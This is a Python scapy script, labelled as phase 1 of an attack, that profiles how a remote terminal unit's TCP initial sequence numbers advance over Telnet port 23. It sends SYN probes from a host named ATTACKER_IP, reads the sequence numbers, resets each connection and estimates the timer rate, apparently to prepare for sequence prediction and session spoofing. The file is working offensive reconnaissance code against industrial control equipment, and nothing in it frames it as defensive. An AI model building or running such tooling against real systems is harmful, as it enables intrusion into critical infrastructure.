"""
Phase 1: Sequence Space Profiling (Reconnaissance Engine).
Samples the RTU's timer-based ISN progression baseline via legitimate un-spoofed TCP handshakes.
Detects polling rhythm and quiescent intervals.
"""
import time
import socket
import struct
from scapy.all import IP, TCP, sr1, conf

conf.verb = 0

RTU_IP = "10.0.1.20"
RTU_PORT = 23
ATTACKER_IP = "10.0.2.50"


class ReconSampler:
    def __init__(self, target_ip: str = RTU_IP, target_port: int = RTU_PORT):
        self.target_ip = target_ip
        self.target_port = target_port

    def sample_server_isn(self) -> tuple[int, float]:
        """
        Sends an un-spoofed SYN to the RTU server and extracts the returned ISN from SYN-ACK.
        Returns: (isn, timestamp)
        """
        sport = 55000 + int(time.time() * 100) % 5000
        syn = IP(src=ATTACKER_IP, dst=self.target_ip) / TCP(sport=sport, dport=self.target_port, flags="S", seq=1000)
        
        t_sent = time.time()
        resp = sr1(syn, timeout=2.0, verbose=False)
        
        if resp and resp.haslayer(TCP) and resp[TCP].flags & 0x12 == 0x12:  # SYN-ACK
            isn = resp[TCP].seq
            # Close connection cleanly
            rst = IP(src=ATTACKER_IP, dst=self.target_ip) / TCP(sport=sport, dport=self.target_port, flags="R", seq=1001)
            sr1(rst, timeout=0.1, verbose=False)
            return isn, t_sent
        else:
            raise RuntimeError(f"[-] Failed to sample ISN from {self.target_ip}:{self.target_port}")

    def profile_clock_rate(self, sample_interval: float = 1.0) -> dict:
        """
        Takes two successive ISN samples separated by sample_interval to compute timer rate (ticks/sec).
        """
        print(f"[RECON] Step 1: Initiating first clock sample to {self.target_ip}:{self.target_port}...")
        isn1, t1 = self.sample_server_isn()
        print(f"[RECON] Sample 1: ISN = {isn1} at t = {t1:.4f}")

        print(f"[RECON] Waiting {sample_interval}s before second sample...")
        time.sleep(sample_interval)

        print(f"[RECON] Step 2: Initiating second clock sample...")
        isn2, t2 = self.sample_server_isn()
        print(f"[RECON] Sample 2: ISN = {isn2} at t = {t2:.4f}")

        delta_t = t2 - t1
        delta_isn = (isn2 - isn1) & 0xFFFFFFFF
        clock_rate = delta_isn / delta_t

        profile = {
            "last_isn": isn2,
            "last_time": t2,
            "clock_rate": clock_rate,
            "sample_interval": delta_t,
        }

        print("\n" + "=" * 60)
        print("  Reconnaissance Sequence Profiling Results")
        print(f"  Delta ISN:   {delta_isn} ticks")
        print(f"  Delta Time:  {delta_t:.4f} seconds")
        print(f"  Estimated Clock Rate: {clock_rate:.2f} ticks/second")
        print("=" * 60 + "\n")

        return profile


def main():
    sampler = ReconSampler()
    try:
        sampler.profile_clock_rate(sample_interval=1.0)
    except Exception as e:
        print(f"[-] Reconnaissance error: {e}")


if __name__ == "__main__":
    main()
